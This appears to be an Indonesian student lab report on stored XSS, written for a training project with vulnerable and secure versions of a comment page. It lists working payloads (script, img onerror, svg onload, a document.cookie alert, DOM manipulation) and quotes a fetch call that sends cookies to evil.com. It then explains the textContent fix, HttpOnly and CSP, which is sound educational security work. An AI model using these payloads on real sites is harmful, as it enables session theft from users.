Eksperimen 1: Stored XSS Attack

Catatan Percobaan
1. <script>alert('XSS!')</script>
Catatan Yang Terjadi : Tiba-tiba muncul kotak popup bertuliskan “XSS!” di layar.
Popup tersebut muncul otomatis tanpa saya klik apa pun.
Setelah halaman di-refresh, popup tersebut muncul lagi. Ini menunjukkan bahwa kode yang dimasukkan ke kolom komentar benar-benar dijalankan oleh browser, bukan hanya ditampilkan sebagai teks biasa.

2. <img src="x" onerror="alert('XSS via img!')">
Catatan Yang Terjadi : Setelah komentar dikirim, muncul popup dengan tulisan “XSS via img!”.
Padahal pada input tersebut tidak ada tag <script> sama sekali.
Hal ini terjadi karena browser tetap menjalankan kode JavaScript yang ada di atribut onerror ketika gambar gagal dimuat. Dari percobaan ini dapat disimpulkan bahwa serangan XSS tidak harus selalu menggunakan tag <script>, tetapi bisa juga melalui atribut HTML lainnya.

3. <svg onload="alert('XSS via svg!')">
Catatan Yang Terjadi : Setelah komentar dikirim, langsung muncul popup dengan tulisan “XSS via svg!”.
Popup muncul otomatis tanpa ada klik tambahan.
Walaupun yang digunakan adalah tag <svg>, kode JavaScript tetap dijalankan karena atribut onload akan dieksekusi saat elemen SVG dimuat oleh browser. Ini menunjukkan bahwa XSS juga bisa terjadi melalui elemen selain <script> atau <img>.
Dari hasil ini dapat disimpulkan bahwa website masih rentan terhadap XSS karena browser menjalankan kode dari input pengguna.

4. <img src="x" onerror="alert('Cookie: ' + document.cookie)">
Catatan Yang Terjadi : Setelah komentar dikirim, muncul popup yang menampilkan isi cookie yang ada di browser, seperti sessionId dan username. Popup tersebut muncul otomatis tanpa perlu klik apa pun.
Dari hasil ini terlihat bahwa website bisa mengakses cookie pengguna melalui input komentar. Walaupun pada percobaan ini hanya ditampilkan lewat alert, sebenarnya data cookie tersebut bisa saja dikirim ke server lain jika kodenya diganti.
Percobaan ini menunjukkan bahwa celah XSS bisa dimanfaatkan untuk mencuri data penting pengguna, terutama cookie yang berkaitan dengan sesi login.

5. <img src="x" onerror="document.body.style.background='red'">
Catatan Yang Terjadi : Setelah komentar dikirim, tampilan website langsung berubah dan background halaman menjadi warna merah. Perubahan ini terjadi secara otomatis tanpa perlu refresh atau klik tambahan.
Dari percobaan ini dapat dilihat bahwa kode JavaScript dari input pengguna bisa mengubah tampilan dan isi halaman website. Hal ini menunjukkan bahwa serangan XSS tidak hanya bisa menampilkan alert, tetapi juga dapat memanipulasi tampilan halaman sesuai keinginan penyerang.
Percobaan ini memperjelas bahwa website masih memiliki celah XSS yang cukup berbahaya jika digunakan di lingkungan sebenarnya.
=========================================================================================================================

Eksperimen 2: Image Tag XSS

Catatan Percobaan
<img src="x" onerror="alert('XSS via img!')"> Bisa bekerja karena Payload ini tetap bekerja walaupun tidak menggunakan tag <script> karena kode JavaScript-nya dijalankan melalui atribut onerror pada tag <img>.
Saat browser mencoba menampilkan gambar dengan sumber yang salah (src="x"), gambar tersebut gagal dimuat. Ketika gagal, browser otomatis menjalankan kode yang ada di onerror, sehingga perintah alert() tetap dieksekusi.
Jadi walaupun tidak ada tag <script>, JavaScript tetap bisa dijalankan lewat event HTML, dan inilah yang membuat serangan XSS tetap berhasil.
==========================================================================================================================

Eksperimen 3: Cookie Stealing Simulation

Catatan Percobaan
Cookie yang muncul di alert adalah Cookie: visitCount=32; sessionId=abc123xyz; username=JohnDoe
Refleksi: Jika attacker mengganti alert() dengan fetch('https://evil.com?cookie=' + document.cookie), yang akan terjadi adalah cookie pengguna bisa dicuri dan dikirim ke server lain secara diam-diam, tanpa ada tanda apa pun di layar.
==========================================================================================================================

Eksperimen 4: DOM Manipulation

Catatan Percobaan
Setelah saya memasukkan komentar dengan payload:
<img src="x" onerror="document.body.style.background='red'">
dan menekan tombol kirim, tampilan halaman langsung berubah. Background website yang sebelumnya normal berubah menjadi warna merah secara otomatis tanpa perlu refresh atau klik apa pun.
Perubahan ini menunjukkan bahwa kode JavaScript dari input pengguna bisa langsung mengubah tampilan dan struktur halaman website. Artinya, melalui celah XSS, penyerang bisa memanipulasi isi dan tampilan halaman sesuai keinginannya.
==========================================================================================================================

Eksperimen 5: Versi Secure

Catatan Percobaan
Pada percobaan ini saya membuka file secure.html lalu mencoba semua payload yang sebelumnya digunakan pada versi vulnerable, seperti <script>, <img onerror>, <svg onload>, dan manipulasi background.
Hasilnya berbeda dengan versi vulnerable. Tidak ada popup yang muncul, tidak ada cookie yang tampil, dan tampilan halaman tidak berubah. Semua payload hanya muncul sebagai teks biasa di kolom komentar.
Dari hasil ini dapat disimpulkan bahwa pada versi secure, input pengguna tidak lagi dijalankan sebagai kode. Artinya, serangan XSS tidak berhasil karena website sudah menggunakan cara yang lebih aman dalam menampilkan komentar.
==========================================================================================================================

Eksperimen 6: Bandingkan Kode

Catatan Percobaan
Pada versi vulnerable, input dari pengguna langsung dimasukkan ke halaman menggunakan innerHTML. Karena dianggap sebagai HTML oleh browser, jika pengguna memasukkan kode seperti <script> atau atribut berisi JavaScript, maka kode tersebut ikut dijalankan. Inilah yang menyebabkan XSS bisa terjadi.
Sedangkan pada versi secure, input pengguna dimasukkan ke dalam elemen menggunakan textContent. Dengan cara ini, semua input dianggap sebagai teks biasa, bukan sebagai kode HTML atau JavaScript. Jadi walaupun pengguna memasukkan tag <script> atau payload XSS lainnya, browser tidak akan menjalankannya, melainkan hanya menampilkannya sebagai tulisan.
Karena input tidak pernah diproses sebagai HTML, versi secure tidak bisa menjalankan JavaScript dari pengguna dan otomatis terlindungi dari serangan XSS.
==========================================================================================================================

Jawaban Pertanyaan Refleksi

1. Mengapa <img onerror> bisa menjalankan JavaScript?
Karena onerror adalah event bawaan HTML yang akan dijalankan ketika gambar gagal dimuat. Saat browser tidak bisa menampilkan gambar dari src, otomatis kode JavaScript yang ada di onerror akan dieksekusi. Jadi walaupun tidak memakai tag <script>, JavaScript tetap bisa jalan lewat event HTML.
2. Apa perbedaan antara Stored XSS dan Reflected XSS dari perspektif attacker?
Dari sisi attacker, Stored XSS lebih berbahaya dan lebih menguntungkan karena payload disimpan di server dan akan dijalankan setiap kali halaman dibuka oleh korban. Attacker tidak perlu mengirim link khusus ke korban.
Sedangkan Reflected XSS hanya terjadi ketika korban membuka link tertentu yang berisi payload. Jadi attacker harus memancing korban untuk mengklik link tersebut setiap kali ingin menyerang.
3. Mengapa HttpOnly cookie penting dalam konteks XSS?
Karena cookie yang diberi atribut HttpOnly tidak bisa diakses oleh JavaScript. Artinya, walaupun terjadi XSS, attacker tidak bisa membaca cookie menggunakan document.cookie. Ini penting untuk melindungi cookie sesi login agar tidak mudah dicuri melalui serangan XSS.
4. Jika kamu perlu menampilkan rich text (dengan formatting), bagaimana caranya agar tetap aman?
Cara yang aman adalah dengan menyaring dan membatasi tag HTML yang boleh digunakan, misalnya hanya <b>, <i>, <p>, dan <br>, serta menghapus atribut berbahaya seperti onerror atau onclick. Bisa juga menggunakan library sanitasi khusus agar hanya formatting yang aman yang ditampilkan, tanpa menjalankan JavaScript.
5. Apa kegunaan Content Security Policy (CSP) header?
CSP digunakan untuk membatasi sumber kode yang boleh dijalankan oleh browser, seperti JavaScript, gambar, atau iframe. Dengan CSP, browser bisa memblokir script yang tidak berasal dari sumber yang diizinkan. Jadi walaupun ada celah XSS, CSP bisa mencegah script berbahaya untuk dijalankan.


# Cookie Counter Latihan 2

Project ini dibuat untuk latihan pemahaman cookie dan keamanan web.
Berisi simulasi vulnerable dan secure untuk pembelajaran.
